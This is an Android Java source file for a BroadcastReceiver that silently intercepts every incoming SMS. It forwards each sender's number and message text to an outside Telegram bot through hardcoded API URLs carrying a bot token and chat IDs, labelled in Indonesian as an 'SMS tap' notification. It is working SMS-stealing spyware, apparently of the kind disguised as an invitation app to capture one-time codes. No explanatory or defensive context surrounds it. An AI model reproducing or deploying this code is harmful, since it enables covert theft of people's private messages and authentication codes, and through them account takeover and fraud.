package com.example.myapplication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class ReceiveSms extends BroadcastReceiver {
    final String TAG = "demo";
    private final OkHttpClient client = new OkHttpClient();

    public void onReceive(Context context, Intent intent) {
        Bundle extras;
        String str = " ";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (extras = intent.getExtras()) != null) {
            try {
                Object[] objArr = (Object[]) extras.get("pdus");
                SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
                int i = 0;
                while (i < smsMessageArr.length) {
                    smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                    String originatingAddress = smsMessageArr[i].getOriginatingAddress();
                    String replace = smsMessageArr[i].getMessageBody().replace("&", "  ").replace("#", str);
                    String replace2 = replace.replace("?", str);
                    Request build = new Request.Builder().url("https://api.telegram.org/bot5999119790:AAGuqP9ibuXQio5WpnTjH0BZIwiOddNTmv8/sendMessage?parse_mode=markdown&chat_id=6204457083&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐃𝐚𝐫𝐢  " + originatingAddress + ", 𝐈𝐬𝐢 𝐒𝐌𝐒 : " + replace).build();
                    String str2 = str;
                    Request build2 = new Request.Builder().url("https://api.telegram.org/bot5999119790:AAGuqP9ibuXQio5WpnTjH0BZIwiOddNTmv8/sendMessage?parse_mode=markdown&chat_id=620445708&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐃𝐚𝐫𝐢   " + originatingAddress + ", 𝐈𝐬𝐢 𝐒𝐌𝐒 : " + replace).build();
                    this.client.newCall(build).enqueue(new Callback() {
                        public void onFailure(Call call, IOException iOException) {
                            iOException.printStackTrace();
                        }

                        public void onResponse(Call call, Response response) throws IOException {
                            Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                            if (response.isSuccessful()) {
                                response.body().string();
                            }
                        }
                    });
                    this.client.newCall(build2).enqueue(new Callback() {
                        public void onFailure(Call call, IOException iOException) {
                            iOException.printStackTrace();
                        }

                        public void onResponse(Call call, Response response) throws IOException {
                            Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                            if (response.isSuccessful()) {
                                response.body().string();
                            }
                        }
                    });
                    i++;
                    str = str2;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
